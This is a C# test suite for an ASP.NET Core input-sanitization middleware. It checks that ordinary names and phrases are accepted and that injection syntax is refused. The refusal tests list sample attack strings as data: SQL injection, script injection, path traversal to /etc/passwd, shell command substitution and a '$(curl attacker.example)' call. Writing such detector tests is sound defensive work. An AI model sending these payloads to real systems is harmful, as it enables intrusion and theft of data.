using System.Net;
using System.Text;
using System.Text.Json;
using Girder.Infrastructure.Security.InputSanitization;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.TestHost;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;

namespace Girder.Infrastructure.Tests.Security.InputSanitization;

/// <summary>
/// The real detector, through the real middleware.
/// </summary>
/// <remarks>
/// <para>The existing middleware suite substitutes <see cref="IInputSanitizer"/>,
/// so it measures the middleware's control flow and never the expressions. That
/// is why a rule matching the bare word <c>SELECT</c> and every single apostrophe
/// survived: nothing here ever asked it about a real word.</para>
/// <para>The refusals below are the ones that must stay. The acceptances are the
/// ones that were measured as 400 against 4.0.2 — real company names, ordinary
/// German compounds, and a Referer naming one of the application's own pages.</para>
/// </remarks>
[Trait("Category", "Unit")]
public class OrdinaryWordsAreNotInjectionTests
{
    /// <summary>
    /// A keyword carries no information about intent. A hyphen is a word
    /// boundary, which is what turned each of these into an attack.
    /// </summary>
    [Theory]
    [InlineData("Union-Investment")]     // a real German asset manager
    [InlineData("Select-Kundenberater")]
    [InlineData("Drop-In-Zentrum")]
    [InlineData("Update-Managerin")]
    [InlineData("delete-account")]
    [InlineData("Order-Management")]
    [InlineData("O'Brien")]
    [InlineData("L'Oréal")]
    [InlineData("Meier & Söhne (Hamburg)")]
    [InlineData("What does that mean; and why?")]
    // A portfolio is where people describe the code they wrote, so this is the
    // normal case there — and it was refused until the substitution rule was
    // made to name a command.
    [InlineData("jQuery migration: replaced $(document).ready()")]
    [InlineData("useEffect(() => { setLoading(false); }, []);")]
    public async Task An_ordinary_search_term_is_answered(string term)
    {
        var status = await Ask($"/echo?q={Uri.EscapeDataString(term)}");

        status.Should().Be(HttpStatusCode.OK, "\"{0}\" is a word, not an injection", term);
    }

    /// <summary>
    /// The counter-probe, and the part that must not get weaker: real injection
    /// syntax is still refused.
    /// </summary>
    [Theory]
    [InlineData("1' OR '1'='1")]
    [InlineData("'; DROP TABLE users; --")]
    [InlineData("admin'--")]
    [InlineData("1 UNION ALL SELECT password FROM users")]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("javascript:alert(1)")]
    [InlineData("../../etc/passwd")]
    [InlineData("x; cat /etc/passwd")]
    [InlineData("x | bash")]
    [InlineData("'; WAITFOR DELAY '0:0:5' --")]
    [InlineData("test)(objectClass=*")]
    [InlineData("$(cat /etc/passwd)")]
    [InlineData("$(curl attacker.example)")]
    public async Task An_injection_is_refused(string attack)
    {
        var status = await Ask($"/echo?q={Uri.EscapeDataString(attack)}");

        status.Should().Be(HttpStatusCode.BadRequest, "\"{0}\" is injection syntax", attack);
    }

    /// <summary>
    /// The Referer names a page, not an input — and it named one of ours.
    /// </summary>
    /// <remarks>
    /// Every request from the account-deletion page carried
    /// <c>Referer: …/delete-account</c>, so every one of them was refused,
    /// including the call asking who is signed in. The page then told a signed-in
    /// person to sign in — on the one page where a promise is made to somebody
    /// about their own data.
    /// </remarks>
    [Theory]
    [InlineData("https://app.example.com/delete-account")]
    [InlineData("https://app.example.com/jobs?q=Union-Investment&page=2")]
    [InlineData("https://app.example.com/select-plan")]
    public async Task A_referer_naming_one_of_our_own_pages_is_not_input(string referer)
    {
        var status = await Ask("/echo", referer: referer);

        status.Should().Be(HttpStatusCode.OK);
    }

    /// <summary>
    /// The other half of the ticket: a JSON body is looked at.
    /// </summary>
    /// <remarks>
    /// It used to pass through untouched — an application whose whole write
    /// surface is JSON was covered nowhere, while the query string it barely uses
    /// was covered twice over.
    /// </remarks>
    [Fact]
    public async Task An_injection_in_a_json_body_is_refused()
    {
        var status = await Send("""{"text":"'; DROP TABLE users; --"}""");

        status.Should().Be(HttpStatusCode.BadRequest);
    }

    /// <summary>And an ordinary body still arrives, unchanged.</summary>
    [Fact]
    public async Task An_ordinary_json_body_arrives_unchanged()
    {
        var body = """{"name":"O'Brien","firm":"Union-Investment","remote_ok":true,"years":7}""";

        var (status, arrived) = await SendAndRead(body);

        status.Should().Be(HttpStatusCode.OK);
        arrived.Should().Be(
            body,
            "the middleware inspects the body — it does not rewrite it");
    }

    /// <summary>
    /// An application that validates its own fields can hand the JSON body back.
    /// </summary>
    /// <remarks>
    /// This filter runs first and cannot name a field, so a precise 422 saying
    /// <em>which</em> value is wrong turns into a blunt 400. For an application
    /// whose validators answer with the field name that is a loss, and the choice
    /// belongs to it — stated, rather than left to a default nobody sees.
    /// </remarks>
    [Fact]
    public async Task An_application_that_validates_can_turn_body_inspection_off()
    {
        var status = await Send(
            """{"url":"javascript:alert(1)"}""",
            new InputSanitizationOptions { InspectJsonBodies = false });

        status.Should().Be(HttpStatusCode.OK, "the validator behind it says which field");
    }

    /// <summary>The counter-probe: on, the same body is refused.</summary>
    [Fact]
    public async Task With_body_inspection_the_same_body_is_refused()
    {
        var status = await Send("""{"url":"javascript:alert(1)"}""");

        status.Should().Be(HttpStatusCode.BadRequest);
    }

    /// <summary>
    /// The refusal is a problem document and names an id somebody can quote.
    /// </summary>
    /// <remarks>
    /// It used to be <c>application/json</c> with an <c>error</c> string and no
    /// id at all — a second error shape to learn, on an answer somebody has to be
    /// able to report.
    /// </remarks>
    [Fact]
    public async Task The_refusal_is_a_problem_document()
    {
        using var host = await Start();

        using var request = new HttpRequestMessage(
            HttpMethod.Get,
            new Uri("http://localhost/echo?q=" + Uri.EscapeDataString("1' OR '1'='1")));
        request.Headers.Add("X-Correlation-ID", "chain-from-the-caller");

        var response = await host.GetTestClient().SendAsync(request);

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        response.Content.Headers.ContentType?.ToString()
            .Should().StartWith("application/problem+json");

        var document = JsonDocument.Parse(await response.Content.ReadAsStringAsync()).RootElement;

        document.GetProperty("correlationId").GetString().Should().Be("chain-from-the-caller");
        document.GetProperty("status").GetInt32().Should().Be(400);
    }

    private static async Task<HttpStatusCode> Ask(string path, string? referer = null)
    {
        using var host = await Start();

        using var request = new HttpRequestMessage(HttpMethod.Get, new Uri($"http://localhost{path}"));
        if (referer is not null)
        {
            request.Headers.Add("Referer", referer);
        }

        return (await host.GetTestClient().SendAsync(request)).StatusCode;
    }

    private static async Task<HttpStatusCode> Send(
        string body,
        InputSanitizationOptions? options = null) =>
        (await SendAndRead(body, options)).Status;

    private static async Task<(HttpStatusCode Status, string Arrived)> SendAndRead(
        string body,
        InputSanitizationOptions? options = null)
    {
        using var host = await Start(options);

        var response = await host.GetTestClient().PostAsync(
            new Uri("http://localhost/echo"),
            new StringContent(body, Encoding.UTF8, "application/json"));

        return (response.StatusCode, await response.Content.ReadAsStringAsync());
    }

    private static async Task<IHost> Start(InputSanitizationOptions? options = null) =>
        await new HostBuilder()
            .ConfigureWebHost(web => web
                .UseTestServer()
                .ConfigureServices(services =>
                {
                    services.AddLogging();
                    services.AddSingleton<IInputSanitizer>(
                        new InputSanitizer(NullLogger<InputSanitizer>.Instance));
                    services.AddSingleton(Options.Create(options ?? new InputSanitizationOptions()));
                })
                .Configure(app =>
                {
                    app.UseMiddleware<InputSanitizationMiddleware>();

                    // Reads the body back out, so a rewrite would show.
                    app.Run(async http =>
                    {
                        using var reader = new StreamReader(http.Request.Body);
                        await http.Response.WriteAsync(await reader.ReadToEndAsync());
                    });
                }))
            .StartAsync();
}
